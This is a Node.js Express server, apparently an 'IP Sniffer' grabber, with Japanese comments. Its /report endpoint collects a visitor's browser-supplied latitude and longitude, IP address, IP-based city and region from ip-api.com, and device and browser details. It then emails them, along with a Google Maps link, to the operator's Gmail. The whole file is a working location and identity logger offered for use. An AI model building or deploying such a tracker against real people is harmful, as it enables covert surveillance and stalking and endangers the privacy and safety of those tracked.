require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const uaParser = require('ua-parser-js');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// スパム対策：IPごとの送信記録
const recentAccessMap = new Map();

app.post('/report', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = rawIp.split(',')[0].trim();

  // スパム防止：10秒に1回のみ許可
  const lastAccess = recentAccessMap.get(ip);
  const now = Date.now();
  if (lastAccess && now - lastAccess < 10 * 1000) {
    return res.status(429).send('スパム防止：しばらく待ってください');
  }
  recentAccessMap.set(ip, now);

  // ユーザーエージェント取得・検証
  const uaRaw = req.headers['user-agent'] || '';
  if (!uaRaw) return res.status(400).send('不正なアクセス');

  const ua = uaParser(uaRaw);

  // 緯度経度検証（空や不正値の弾き）
  const { latitude, longitude } = req.body;
  if (
    !latitude || !longitude ||
    isNaN(latitude) || isNaN(longitude)
  ) {
    return res.status(400).send('位置情報が正しくありません');
  }

  const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  // IPベース位置情報取得（無料）
  let geo = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    geo = await geoRes.json();
  } catch (err) {
    console.error('IPジオAPIエラー:', err);
  }

  // Gmail設定
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `IP Sniffer <${process.env.GMAIL_USER}>`,
    to: process.env.GMAIL_USER,
    subject: '📡 アクセス情報通知（無料構成）',
    text: `
📡 アクセス情報：
- IPアドレス: ${ip}
- 国: ${geo.country || '不明'}
- 地域: ${geo.regionName || '不明'}
- 市区町村: ${geo.city || '不明'}
- 緯度/経度: ${latitude} / ${longitude}
- Google Maps: ${locationLink}
- 端末: ${ua.device.type || 'PC'} / ${ua.os.name || '不明'} / ${ua.browser.name || '不明'}
- アクセス時間: ${new Date().toLocaleString()}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log(`[✔] メール送信完了 - ${ip}`);
  } catch (error) {
    console.error(`[✖] メール送信失敗 - ${ip}`, error);
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`📡 Server running on http://localhost:${PORT}`);
});

